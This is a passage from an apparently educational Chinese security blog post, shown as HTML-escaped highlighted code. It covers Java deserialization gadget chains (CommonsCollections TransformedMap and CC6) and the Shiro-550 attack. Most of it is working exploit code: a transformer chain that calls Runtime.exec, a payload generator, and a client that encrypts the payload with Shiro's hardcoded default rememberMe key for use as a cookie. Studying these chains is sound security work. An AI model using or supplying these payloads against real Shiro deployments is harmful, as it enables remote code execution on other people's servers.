&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;xxxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="cck1shiro-550">CCK1(Shiro-550)&lt;/h2>
&lt;p>p牛给出了一个&lt;a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">小demo&lt;/a>，只有两个jsp，依赖有这些&lt;/p>
&lt;ul>
&lt;li>shiro-core、shiro-web，这是shiro本身的依赖&lt;/li>
&lt;li>javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这两个依赖&lt;/li>
&lt;li>slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖&lt;/li>
&lt;li>commons-logging，这是shiro中用到的一个接口，不添加会爆java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory错误&lt;/li>
&lt;li>commons-collections，为了演示反序列化漏洞，增加了commons-collections依赖，版本为3.2.1&lt;/li>
&lt;/ul>
&lt;p>打war包后部署在本地&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301201435981.png" alt="image-20220301201435981">&lt;/p>
&lt;p>抓包可以看到，不勾选&lt;code>Remember Me&lt;/code>时cookie有rememberMe=deleteMe，勾选的话则是&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301202246982.png" alt="image-20220301202246982">&lt;/p>
&lt;p>这里的b64加密信息是AES，在&lt;code>org.apache.shiro.mgt.AbstractRememberMeManager&lt;/code>中可以看到默认key&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232709437.png" alt="image-20220301232709437">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232313280.png" alt="image-20220301232313280">&lt;/p>
&lt;p>可以看到它在同名的构造函数中设置了这个default key，而控制cookie信息&lt;code>org.apache.shiro.web.mgt.CookieRememberMeManager&lt;/code>继承了这个类&lt;/p>
&lt;p>由于它使用了默认key并且用了cc依赖，我们的攻击过程是这样的：&lt;/p>
&lt;ul>
&lt;li>用CC链生成payload&lt;/li>
&lt;li>用Shiro默认key进行加密&lt;/li>
&lt;li>将密文作为rememberMe的Cookie发送给服务端&lt;/li>
&lt;/ul>
&lt;h3 id="cc6为什么不行">CC6为什么不行&lt;/h3>
&lt;p>p牛写了一个基于CC6的exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">com.govuln.shiroattack&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.crypto.AesCipherService&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.util.ByteSource&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client0&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#f92672">[]&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">payloads&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">CommonsCollections6&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;whoami&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AesCipherService&lt;/span> &lt;span style="color:#111">aes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AesCipherService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteSource&lt;/span> &lt;span style="color:#111">ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">aes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">payloads&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ciphertext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">com.govuln.shiroattack&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections6&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">command&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
